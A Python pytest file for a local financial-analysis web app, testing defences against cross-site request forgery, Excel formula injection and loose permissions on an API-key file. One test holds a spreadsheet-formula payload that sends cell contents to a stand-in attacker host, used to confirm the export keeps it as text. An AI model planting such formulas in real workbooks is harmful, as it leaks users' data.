"""Security: requests from other websites (CSRF), formula injection in the Excel export, key file permissions."""
import json
import os
import stat
import sys
import time
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE))

import make_s1  # noqa: E402
import server  # noqa: E402
from analyst import ai, pipeline, xlsx_export  # noqa: E402
from test_exports import sheets  # noqa: E402

EVIL = "https://evil.example"
SELF = f"http://127.0.0.1:{server.PORT}"


@pytest.fixture
def client(monkeypatch):
    monkeypatch.setattr(server, "_need_ai", lambda: None)
    monkeypatch.setattr(server, "_start", lambda req: pytest.fail("a blocked request started a job"))
    return TestClient(server.app, base_url=SELF)


def test_other_websites_cannot_post(client):
    # a page elsewhere can make the browser POST here: it must not start analyses, change settings or stop the app
    for path in ("/api/analyze", "/api/relang", "/api/settings", "/api/quit", "/api/ai/test"):
        assert client.post(path, json={"kind": "sec", "query": "MSFT"}, headers={"Origin": EVIL}).status_code == 403, path
        assert client.post(path, json={}, headers={"Sec-Fetch-Site": "cross-site"}).status_code == 403, path
        assert client.post(path, json={}, headers={"Origin": "null"}).status_code == 403, path
    r = client.post("/api/upload", files={"file": ("a.pdf", b"%PDF-1.4")}, headers={"Origin": EVIL, "Sec-Fetch-Site": "cross-site"})
    assert r.status_code == 403


def test_other_websites_cannot_load_the_api(client):
    # <img src="http://127.0.0.1:8765/api/…"> on another site
    h = {"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "no-cors"}
    assert client.get("/api/status", headers=h).status_code == 403
    assert client.get("/api/search", params={"q": "x"}, headers=h).status_code == 403
    assert client.get("/api/status", headers={"Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors"}).status_code == 403
    # a link to the app from elsewhere still opens it
    assert client.get("/", headers={"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate"}).status_code == 200


def test_the_app_itself_still_works(client):
    same = {"Origin": SELF, "Sec-Fetch-Site": "same-origin"}
    assert client.get("/api/status", headers={"Sec-Fetch-Site": "same-origin"}).status_code == 200
    # past the guard: the request is judged on its content
    assert client.post("/api/relang", json={"id": "x", "lang": "en"}, headers=same).status_code == 400
    assert client.post("/api/relang", json={"id": "x", "lang": "en"}, headers={**same, "Origin": "http://localhost:%d" % server.PORT}).status_code == 400
    # tools without a browser (the launcher, curl) send neither header
    assert client.get("/api/status").status_code == 200


def test_posts_must_be_json_objects(client):
    for path in ("/api/analyze", "/api/relang", "/api/settings"):
        assert client.post(path, content=b'{"kind": "sec"}', headers={"Content-Type": "text/plain"}).status_code == 415, path
        assert client.post(path, content=b"{not json", headers={"Content-Type": "application/json"}).status_code == 400, path
        assert client.post(path, json=["kind", "sec"]).status_code == 400, path


def test_finished_jobs_are_forgotten(monkeypatch):
    monkeypatch.setattr(server.pool, "submit", lambda f: None)
    old = time.time() - server.JOB_TTL - 1
    server.jobs.update({"done1": {"status": "done", "t": old}, "err1": {"status": "error", "t": old},
                        "run1": {"status": "running", "t": old}, "new1": {"status": "done", "t": time.time()}})
    jid = server._start({"kind": "relang", "id": "0" * 16, "lang": "en"})
    assert {"done1", "err1"}.isdisjoint(server.jobs) and {"run1", "new1", jid} <= set(server.jobs)
    for k in ("run1", "new1", jid):
        server.jobs.pop(k)


def test_workbook_keeps_document_text_as_text(monkeypatch, tmp_path):
    # a line printed in the document as a formula must not become one in the user's Excel
    monkeypatch.setattr(pipeline, "DOCS", tmp_path / "docs")
    monkeypatch.setattr(ai, "active", lambda: None)
    a = json.loads(json.dumps(pipeline.run({"kind": "upload", "data": make_s1.s1().encode(), "name": "s1.htm", "lang": "en"}, lambda *_: None)))
    evil = '=HYPERLINK("https://evil.example/?d="&A1,"Revenue")'
    a["title"] = evil
    next(iter(a["facts"].values()))["label"] = evil
    xml = "".join(sheets(xlsx_export.build(a)).values())
    assert "HYPERLINK" in xml and "<f>HYPERLINK" not in xml and "<f>=HYPERLINK" not in xml
    assert "<f>" in xml                                     # the workbook's own formulas (changes, free cash flow) stay


@pytest.mark.skipif(os.name == "nt", reason="POSIX permissions")
def test_key_file_is_private(monkeypatch, tmp_path):
    monkeypatch.setattr(ai, "CONFIG_DIR", tmp_path)
    monkeypatch.setattr(ai, "AI_FILE", tmp_path / "ai.json")
    old = os.umask(0o022)
    try:
        ai.save_settings("openai", "sk-test-abcdefghij")
        assert stat.S_IMODE((tmp_path / "ai.json").stat().st_mode) == 0o600
        (tmp_path / "ai.json").chmod(0o644)                # written by an earlier version
        ai.save_settings("openai", "sk-test-abcdefghij")
        assert stat.S_IMODE((tmp_path / "ai.json").stat().st_mode) == 0o600
    finally:
        os.umask(old)
